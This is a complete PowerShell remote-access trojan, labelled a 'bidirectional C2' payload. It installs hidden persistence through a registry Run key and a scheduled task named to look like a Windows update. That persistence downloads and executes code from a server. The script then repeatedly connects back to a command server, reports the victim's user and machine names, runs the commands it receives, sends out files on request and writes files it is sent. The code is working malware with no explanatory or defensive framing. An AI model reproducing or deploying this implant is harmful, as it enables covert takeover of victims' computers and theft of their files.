# payload.ps1 - Full bidirectional C2
$SERVER = "127.0.0.1"
$C2_PORT = 4444

$ID = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 8 | % { [char]$_ })
$USER = $env:USERNAME
$COMPUTER = $env:COMPUTERNAME
$HOSTNAME = $env:COMPUTERNAME

function Install-Persistence {
    $cmd = "powershell -w hidden -ep bypass -c `"iex (New-Object Net.WebClient).DownloadString('http://$SERVER`:8080/payload.ps1')`""
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinUpd /t REG_SZ /d "$cmd" /f 2>$null
    schtasks /create /tn "WinUpd" /tr "$cmd" /sc daily /st 02:00 /f 2>$null
}

function Execute-Command {
    param([string]$cmd)
    
    $output = ""
    $errorOutput = ""
    
    # Try PowerShell execution
    try {
        $result = Invoke-Expression $cmd -ErrorAction Stop -ErrorVariable psErr
        if ($psErr) { $errorOutput = $psErr | Out-String }
        if ($result -eq $null -and [string]::IsNullOrEmpty($errorOutput)) { 
            return "[+] Command executed (no output)"
        }
        if ($result -is [string] -and $result.Length -eq 0 -and [string]::IsNullOrEmpty($errorOutput)) {
            return "[+] Command executed (empty output)"
        }
        $output = $result | Out-String
    } catch {
        # Fallback to cmd
        try {
            $output = cmd /c $cmd 2>&1 | Out-String
        } catch {
            return "ERROR: $($_.Exception.Message)"
        }
    }
    
    # Combine output and errors
    $fullOutput = $output
    if (![string]::IsNullOrEmpty($errorOutput)) {
        $fullOutput += "`n`n[ERRORS]`n$errorOutput"
    }
    
    return $fullOutput
}

function Connect-C2 {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($SERVER, $C2_PORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # Send registration with full system info
        $sysInfo = @"
REGISTER:$ID|$USER|$COMPUTER|$env:OS|$env:PROCESSOR_ARCHITECTURE|$env:COMPUTERNAME
"@
        $writer.WriteLine($sysInfo)
        
        while ($client.Connected) {
            if ($stream.DataAvailable) {
                $line = $reader.ReadLine()
                if ($line -eq $null) { break }
                
                if ($line -match "^CMD:(.*)") {
                    $cmd = $Matches[1]
                    $result = Execute-Command $cmd
                    
                    # Split long results into chunks (max 4096 bytes per send)
                    $chunkSize = 4000
                    $resultLength = $result.Length
                    
                    if ($resultLength -le $chunkSize) {
                        $writer.WriteLine("RESULT:$result")
                    } else {
                        $chunks = [math]::Ceiling($resultLength / $chunkSize)
                        for ($i = 0; $i -lt $chunks; $i++) {
                            $start = $i * $chunkSize
                            $end = [math]::Min(($start + $chunkSize), $resultLength)
                            $chunk = $result.Substring($start, $end - $start)
                            $writer.WriteLine("RESULT_CHUNK:$($i+1)/$chunks`n$chunk")
                        }
                        $writer.WriteLine("RESULT_END")
                    }
                }
                elseif ($line -eq "PING") { 
                    $writer.WriteLine("PONG:$ID") 
                }
                elseif ($line -eq "EXIT") { 
                    break 
                }
                elseif ($line -match "^DOWNLOAD:(.*)") {
                    # File download request
                    $filePath = $Matches[1]
                    if (Test-Path $filePath) {
                        $bytes = [System.IO.File]::ReadAllBytes($filePath)
                        $b64 = [Convert]::ToBase64String($bytes)
                        $writer.WriteLine("FILE_START:$filePath|$($bytes.Length)")
                        $writer.WriteLine($b64)
                        $writer.WriteLine("FILE_END")
                    } else {
                        $writer.WriteLine("FILE_ERROR:File not found")
                    }
                }
                elseif ($line -match "^UPLOAD:(.*)\|(.*)") {
                    # File upload
                    $filePath = $Matches[1]
                    $b64Data = $Matches[2]
                    try {
                        $bytes = [Convert]::FromBase64String($b64Data)
                        [System.IO.File]::WriteAllBytes($filePath, $bytes)
                        $writer.WriteLine("UPLOAD_OK:$filePath")
                    } catch {
                        $writer.WriteLine("UPLOAD_ERROR:$($_.Exception.Message)")
                    }
                }
            }
            Start-Sleep -Milliseconds 100
        }
    } catch {
        # Silent fail - will retry
    } finally {
        if ($client) { $client.Close() }
    }
}

Install-Persistence
while ($true) {
    Connect-C2
    Start-Sleep -Seconds 30
}